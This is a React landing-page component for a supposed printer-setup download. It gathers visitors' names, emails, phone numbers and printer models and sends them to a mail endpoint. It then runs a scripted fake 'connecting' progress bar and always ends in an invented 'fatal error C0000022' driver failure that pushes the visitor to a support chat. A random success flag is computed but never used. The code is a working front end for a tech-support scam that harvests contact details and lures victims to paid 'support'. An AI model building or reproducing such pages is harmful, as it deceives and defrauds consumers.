"use client";
import React, { useState, useEffect } from "react";
import { Printer, Wifi, X, AlertCircle } from "lucide-react";

export default function Hero() {
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
    printerModel: "",
  });

  const [countryCode, setCountryCode] = useState("");
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [loadingText, setLoadingText] = useState("Connecting to Printer...");
  const [isLoading, setIsLoading] = useState(false);

  // Detect user country and set country code
  useEffect(() => {
    async function detectCountry() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        let code = "";

        switch (data.country_code) {
          case "GB":
            code = "+44"; // UK
            break;
          case "AU":
            code = "+61"; // Australia
            break;
          case "US":
            code = "+1"; // USA
            break;
          case "NZ":
            code = "+64"; // New Zealand
            break;
          default:
            code = "+1"; // Default to USA if unknown
        }

        setCountryCode(code);
        setFormData((prev) => ({
          ...prev,
          phone: code + " ",
        }));
      } catch (err) {
        console.error("Country detection failed:", err);
        setCountryCode("+1");
        setFormData((prev) => ({ ...prev, phone: "+1 " }));
      }
    }

    detectCountry();
  }, []);

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!formData.name || !formData.email || !formData.phone || !formData.printerModel) {
      alert("Please fill in all fields before downloading.");
      return;
    }

    setIsLoading(true);

    try {
      const res = await fetch("/api/smtp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: formData.name,
          email: formData.email,
          phone: formData.phone, // full phone with code
          printerModel: formData.printerModel,
        }),
      });

      setIsLoading(false);
      const data = await res.json();

      if (!res.ok || !data?.ok) {
        // data?.error || 
        alert("Something went wrong. Please try again.");
        return;
      }
    } catch (err) {
      alert("Network error. Please try again.");
      return;
    }

    // Simulated setup sequence
    setFormData({
      name: "",
      email: "",
      phone: countryCode + " ",
      printerModel: "",
    });
    setShowLoadingModal(true);
    setLoadingProgress(0);
    setLoadingText("Connecting to Printer...");

    let intervalId;
    const timeouts = [];

    intervalId = setInterval(() => {
      setLoadingProgress((prev) => {
        if (prev >= 90) {
          clearInterval(intervalId);
          return 90;
        }
        return prev + 2;
      });
    }, 150);

    timeouts.push(setTimeout(() => setLoadingText("Joining the network and getting printer address..."), 1500));
    timeouts.push(setTimeout(() => setLoadingText("Connected to printer network..."), 3000));

    const isSuccess = Math.random() > 0.4;

    timeouts.push(
      setTimeout(() => {
        clearInterval(intervalId);
        setShowLoadingModal(false);
        setShowErrorModal(true);
      }, 7000)
    );

    return () => {
      clearInterval(intervalId);
      timeouts.forEach(clearTimeout);
    };
  };

  const closeErrorModal = () => {
    setShowErrorModal(false);
    setLoadingProgress(0);
  };

  const openChat = () => {
    if (typeof window !== "undefined" && window.jivo_api) {
      window.jivo_api.open();
      closeErrorModal();
    }
  };

  const inputClass =
    "w-full px-5 py-3 rounded-lg bg-white/90 border border-gray-200 text-gray-700 placeholder-gray-600 focus:ring-2 focus:ring-blue-400 outline-none";

  return (
    <>
      {/* Hero Section */}
      <section className="relative bg-gradient-to-br from-blue-600 via-blue-700 to-blue-900 flex flex-col items-center justify-center overflow-hidden px-4 sm:px-6 md:px-10 py-4">
        <div
          className="absolute inset-0 opacity-10"
          style={{
            backgroundImage:
              "repeating-linear-gradient(45deg, transparent, transparent 30px, rgba(255,255,255,0.05) 30px, rgba(255,255,255,0.05) 60px)",
          }}
        ></div>

        <div className="relative z-10 max-w-7xl w-full flex flex-col lg:flex-row items-center justify-between gap-10 lg:gap-16">
          {/* Left Side */}
          <div className="flex-1 text-center lg:text-left space-y-6">
            <h1 className="text-3xl sm:text-4xl md:text-4xl font-bold text-white leading-tight">
              Set Up Your Printer in Just 3 Easy Steps
            </h1>
            <p className="text-base sm:text-lg md:text-xl text-blue-100">
              Download and install the official printer setup simulator for your device.
            </p>
            <div className="flex justify-center lg:justify-start">
              <img
                src="/herobanner.webp"
                alt="Printer"
                className="w-3/4 sm:w-2/3 md:w-1/2 lg:w-[70%] mx-auto lg:mx-0 drop-shadow-lg"
              />
            </div>
          </div>

          {/* Right Side - Form */}
          <div className="flex-1 max-w-md w-full bg-white/10 backdrop-blur-lg border border-white/20 rounded-2xl p-6 sm:p-8 shadow-2xl">
            <div className="space-y-4 sm:space-y-5">
              <input
                type="text"
                name="name"
                placeholder="Your Name"
                value={formData.name}
                onChange={handleChange}
                className={inputClass}
              />
              <input
                type="email"
                name="email"
                placeholder="Email Address"
                value={formData.email}
                onChange={handleChange}
                className={inputClass}
              />
              <input
                type="tel"
                name="phone"
                placeholder="Phone Number"
                value={formData.phone}
                onChange={handleChange}
                className={inputClass}
              />
              <input
                type="text"
                name="printerModel"
                placeholder="Printer Model (e.g. HP 2776)"
                value={formData.printerModel}
                onChange={handleChange}
                className={inputClass}
              />
              <button
                onClick={handleSubmit}
                className="w-full bg-blue-600 hover:bg-blue-700 cursor-pointer border-2 border-white text-white font-semibold py-3 rounded-lg text-lg shadow-md hover:shadow-lg transform hover:scale-[1.02] transition-all duration-200"
              >
                {isLoading ? "Downloading..." : "Click to Download"}
              </button>
            </div>
            <p className="text-center text-xs sm:text-sm text-blue-100 mt-4">
              Safe • Demo Setup • Simulation Only
            </p>
          </div>
        </div>
      </section>

      {/* Loading Modal */}
      {showLoadingModal && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-gray-100 rounded-2xl shadow-2xl w-full max-w-lg sm:max-w-2xl p-6 sm:p-8">
            <div className="bg-blue-600 text-white text-center py-3 rounded-t-xl -mx-6 sm:-mx-8 -mt-6 sm:-mt-8 mb-6 sm:mb-8">
              <h2 className="text-xl sm:text-2xl font-bold">
                Connecting Printer to Network
              </h2>
            </div>

            <p className="text-center text-gray-700 mb-6 sm:mb-8 text-sm sm:text-base">
              Please stay on this screen while setup completes. This is a simulation.
            </p>

            <div className="flex flex-col sm:flex-row items-center justify-center gap-6 sm:gap-8 mb-10">
              <Printer className="w-20 h-20 sm:w-28 sm:h-28 text-gray-600" />
              <div className="flex gap-2">
                {[...Array(6)].map((_, i) => (
                  <div
                    key={i}
                    className="w-2.5 h-2.5 sm:w-3 sm:h-3 bg-blue-600 rounded-full animate-pulse"
                    style={{ animationDelay: `${i * 0.3}s` }}
                  ></div>
                ))}
              </div>
              <Wifi className="w-20 h-20 sm:w-28 sm:h-28 text-blue-500" />
            </div>

            <div className="text-center mb-6">
              <p className="text-lg sm:text-xl font-semibold text-gray-800">
                {loadingText}
              </p>
            </div>

            <div className="w-full bg-gray-300 rounded-full h-4 sm:h-5 overflow-hidden">
              <div
                className="bg-blue-600 h-full transition-all duration-300 ease-out"
                style={{ width: `${loadingProgress}%` }}
              ></div>
            </div>
          </div>
        </div>
      )}

      {/* Error Modal */}
      {showErrorModal && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-2xl shadow-2xl w-full max-w-lg sm:max-w-2xl overflow-hidden">
            <div className="bg-gray-100 px-6 sm:px-8 py-4 border-b border-gray-200 flex justify-between items-center">
              <div>
                <h2 className="text-xl sm:text-2xl font-bold text-gray-800">Installing</h2>
                <p className="text-gray-600 text-sm">
                  Fatal error occurred during installation..
                </p>
              </div>
              <button
                onClick={closeErrorModal}
                className="text-gray-400 hover:text-gray-600 transition-colors cursor-pointer"
              >
                <X className="w-6 h-6" />
              </button>
            </div>

            <div className="text-center">
              <div className="flex justify-center mb-4 px-8 pt-8 sm:px-12 sm:pt-12">
                <div className="relative">
                  <Printer className="w-24 h-24 sm:w-32 sm:h-32 text-gray-400" />
                  <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2">
                    <div className="w-12 h-12 sm:w-16 sm:h-16 border-4 sm:border-8 border-red-600 rounded-full flex items-center justify-center">
                      <AlertCircle className="w-6 sm:w-8 h-6 sm:h-8 text-red-600" />
                    </div>
                  </div>
                </div>
              </div>

              <p className="text-base sm:text-lg text-gray-700 mb-4 max-w-lg mx-auto">
                Printer driver installation has failed due to fatal error
                C0000022 preventing product driver installation.
              </p>

              <p className="text-xl sm:text-2xl font-semibold text-gray-800 mb-6">
                Please Contact Customer Support or Chat with Us
              </p>

              <div className="bg-gradient-to-r from-red-600 to-red-700 text-white py-4 px-6 sm:px-12 flex flex-col sm:flex-row items-center justify-between gap-4">
                <p className="text-lg sm:text-xl font-bold">Printer Assistance</p>
                <button
                  onClick={openChat}
                  className="bg-white cursor-pointer text-red-600 font-semibold py-2 px-5 rounded-md shadow hover:bg-gray-100 transition"
                >
                  Chat Now
                </button>
                <div className="bg-white rounded-full p-3 sm:p-4">
                  <Printer className="w-6 sm:w-8 h-6 sm:h-8 text-red-600" />
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </>
  );
}
